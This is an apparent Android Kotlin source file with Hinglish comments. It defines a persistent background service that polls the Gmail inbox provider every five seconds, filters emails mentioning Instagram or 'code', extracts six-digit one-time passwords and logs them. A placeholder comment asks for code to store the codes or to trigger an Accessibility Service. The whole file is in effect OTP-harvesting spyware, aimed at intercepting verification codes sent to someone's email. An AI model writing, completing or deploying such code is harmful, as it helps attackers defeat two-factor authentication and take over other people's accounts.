package com.your.package.name // Is line ko apne package name se replace karo

import android.app.Service
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.util.Log
import java.util.regex.Pattern

class EmailOtpScanner : Service() {

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Run in a separate thread to avoid blocking main UI
        Thread {
            while (true) {
                try {
                    // Gmail Provider URI
                    val uri = Uri.parse("content://com.google.android.gm.provider/inbox")
                    val projection = arrayOf("subject", "bodySnippet")
                    
                    val cursor = contentResolver.query(uri, projection, null, null, null)
                    
                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            val subjectIndex = cursor.getColumnIndexOrThrow("subject")
                            val bodyIndex = cursor.getColumnIndexOrThrow("bodySnippet")
                            
                            val subject = cursor.getString(subjectIndex)
                            val body = cursor.getString(bodyIndex)
                            
                            // Check if email is from Instagram or contains 'code'
                            if (subject?.contains("Instagram", ignoreCase = true) == true || 
                                body?.contains("code", ignoreCase = true) == true) {
                                
                                val otp = extractOtp(body ?: "")
                                if (otp != null) {
                                    Log.d("EMAIL_OTP", "Caught Email OTP: $otp")
                                    saveOtpLocally(otp)
                                }
                            }
                        } while (cursor.moveToNext())
                        cursor.close()
                    }
                } catch (e: Exception) {
                    Log.e("EMAIL_SCANNER_ERROR", "Error reading emails", e)
                }
                
                Thread.sleep(5000) // Check every 5 seconds
            }
        }.start()
        
        return START_STICKY
    }
    
    private fun extractOtp(text: String): String? {
        // Regex for 6-digit numbers
        val pattern = Pattern.compile("\\b\\d{6}\\b")
        val matcher = pattern.matcher(text)
        return if (matcher.find()) matcher.group() else null
    }

    private fun saveOtpLocally(otp: String) {
        // Yahan wo logic likho jo OTP ko store kare ya Accessibility Service ko trigger kare
        Log.d("OTP_STORAGE", "Saved OTP: $otp")
    }

    override fun onBind(intent: Intent?): android.os.IBinder? {
        return null
    }
}
